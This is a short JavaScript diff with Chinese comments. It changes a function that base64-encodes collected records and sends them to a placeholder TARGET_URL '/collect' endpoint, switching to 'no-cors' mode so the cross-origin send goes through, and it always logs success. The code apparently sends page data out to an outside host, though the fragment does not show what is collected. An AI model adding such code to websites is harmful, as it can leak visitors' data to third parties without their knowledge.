@@ -99,23 +99,20 @@
             const jsonData = JSON.stringify(data);
             const encoded = base64Encode(jsonData);
             
+            // 构建要发送的数据字符串
+            const postData = `data=${encodeURIComponent(encoded)}`;
+            
+            // 方式1: 使用fetch（支持跨域）
             const response = await fetch(`https://${TARGET_URL}/collect`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: JSON.stringify({
-                    data: encoded,
-                    timestamp: new Date().toISOString(),
-                    source: window.location.hostname
-                })
+                body: postData,
+                mode: 'no-cors'  // no-cors模式允许发送但无法读取响应
             });
             
-            if (response.ok) {
-                console.log(`✅ 数据发送成功 (${data.length}条记录)`);
-            } else {
-                console.error(`❌ 发送失败: ${response.status}`);
-            }
+            console.log(`✅ 数据已发送 (${data.length}条记录)`);
         } catch (error) {
             console.error('❌ 发送错误:', error.message);
         }
